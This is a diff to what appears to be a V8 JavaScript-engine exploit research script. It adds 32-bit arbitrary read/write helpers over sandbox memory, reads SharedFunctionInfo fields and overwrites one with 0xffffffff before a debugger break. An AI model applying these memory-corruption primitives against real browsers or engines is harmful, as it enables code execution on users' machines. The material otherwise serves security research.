@@ -14,6 +14,16 @@ function v8_write64(addr, val) {
 return sandboxMemory.setBigInt64(Number(addr), val, true);
 }
 
+function v8_read32(addr) {
+    // return sandboxMemory.getBigUint32(Number(addr), true);
+    return BigInt(sandboxMemory.getUint32(Number(addr), true));
+    }
+
+function v8_write32(addr, val) {
+// return sandboxMemory.setBigInt32(Number(addr), val, true);
+return sandboxMemory.setUint32(Number(addr), val, true);
+}
+
 //============================================================================
 
 const memory = new WebAssembly.Memory({ initial: 1, maximum: 256, shared: true});
@@ -66,8 +76,9 @@ pwndbg> x/10wx 0x2e72002926fd-1
 
 */
 
-let addr2 = v8_read64(store_sfi-1n+0x30n) & 0xffffffffn;
-let store_function_data = v8_read64(addr2+7n); // function_data 
+let addr2 = v8_read32(store_sfi-1n+0x30n);
+let data2 = v8_read32(addr2-1n +8n); // function_data 
+console.log("data2: 0x" + data2.toString(16));
 /* 
   Tagged<Object> handler =
       constructor->shared()->api_func_data()->GetInstanceCallHandler();
@@ -76,10 +87,10 @@ let store_function_data = v8_read64(addr2+7n); // function_data
 // let addr3 = v8_read64(load_sfi-1n+0x30n) & 0xffffffffn;
 // let original2 = v8_read64(addr3+7n);
 
-// v8_write64(addr2+7n, original + 0x20n);
-// console.log(original2.toString(16));
-// console.log(original.toString(16));
-// console.log(v8_read64(addr2+7n).toString(16));
+console.log(v8_read64(store_sfi - 7n).toString(16));
+v8_write32(store_sfi - 7n, 0xffffffff);
+console.log(v8_read64(store_sfi - 7n).toString(16));
+
 
 %SystemBreak();
 store(1, 0x42);
